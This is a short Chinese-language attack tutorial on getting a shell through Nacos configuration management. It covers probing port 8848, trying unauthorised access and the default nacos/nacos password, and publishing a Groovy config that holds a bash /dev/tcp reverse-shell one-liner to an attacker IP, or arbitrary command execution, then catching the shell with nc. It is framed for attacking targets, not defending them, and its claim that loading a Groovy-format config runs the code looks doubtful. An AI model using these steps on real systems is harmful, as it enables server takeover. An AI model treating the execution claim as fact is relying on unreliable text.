### Nacos 如何通过配置文件拿 Shell

**1. 信息收集与漏洞探测**

首先，需要找到目标 Nacos 服务的地址和端口。常见的默认端口是 **8848**

- **访问 Nacos 控制台**：通过浏览器访问 `http://<Nacos_IP>:8848/nacos`
- **判断是否存在未授权访问**：如果无需登录即可访问控制台，则存在未授权访问漏洞
- **尝试弱口令**：如果需要登录，可以尝试使用 Nacos 的默认弱口令，例如 `nacos/nacos`

**2. 构造恶意 Groovy 配置文件**

在获取到 Nacos 控制台的权限后，下一步是构造一个包含恶意代码的配置文件

- **创建新的配置**：在 Nacos 控制台中，进入“配置管理” -> “配置列表”，点击“+”号创建新配置
- **配置参数**：
  - **Data ID**：配置的唯一标识，可以任意命名，例如 `shell.groovy`
  - **Group**：配置的分组，默认即可
  - **配置格式**：**非常关键的一步，必须选择 `Groovy`**
  - **配置内容**：在配置内容中写入恶意 Groovy 代码

以下是两种常见的 Groovy Shell 代码：

**反弹 Shell**：

```groovy
def process = "bash -i >& /dev/tcp/攻击者IP/端口 0>&1".execute()
```

请将 **攻击者IP** 和 **端口** 替换为你自己的 IP 地址和监听端口

**命令执行**：

```groovy
def process = "ls -la".execute()
def output = new StringBuilder()
process.consumeProcessOutput(output, output)
println output.toString()
```

你可以将 `ls -la` 替换为你想要执行的任意命令

**3. 发布配置并触发**

- **发布配置**：填写好 Data ID、Group 和恶意 Groovy 代码后，点击“发布”
- **触发条件**：
  - **应用程序加载配置**：目标应用程序需要集成 Nacos 并加载这个新发布的配置。通常，应用程序会通过 Nacos SDK 定期拉取配置。一旦应用加载了 `shell.groovy` 这个配置，Groovy 代码就会被执行
  - **配置刷新**：许多 Spring Boot 等应用框架在集成 Nacos 时，会配置自动刷新。当配置有更新时，应用会重新加载。

**4. 获取 Shell**

- **反弹 Shell**：在发布恶意配置前，需要在攻击者服务器上使用 `nc` 命令监听端口，例如 `nc -lvnp 端口`。一旦目标应用加载配置，你就会在监听端口上收到一个反弹回来的 Shell
- **命令执行**：如果使用命令执行的方式，执行结果会显示在 Nacos 的日志或应用日志中。但这种方式需要你多次修改配置来执行不同的命令，无法形成一个交互式的 Shell